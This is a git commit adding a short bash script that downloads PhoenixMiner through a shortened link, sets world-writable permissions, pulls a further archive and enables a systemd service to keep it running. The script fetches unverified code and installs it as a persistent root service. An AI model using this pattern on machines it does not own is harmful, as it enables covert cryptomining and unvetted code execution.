b5c2cd6c93ba103bb30de7810f56fa6fef434346
hiseller <62457398+hiseller@users.noreply.github.com>
2021-02-21 12:15:52 +0800

    Add files via upload

---
+++ sh.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+wget wget https://bit.ly/3nDvbjt
+unzip 3nDvbjt
+sudo mv PhoenixMiner_5.5b_Linux eth
+sudo rm -r PhoenixMiner_5.5b_Linux.zip
+sudo chmod 777 eth/PhoenixMiner
+wget https://github.com/hiseller/mine1/raw/main/us.tar.gz
+tar xvf us.tar.gz
+sudo systemctl enable ~/new.service
+sudo systemctl start new.service
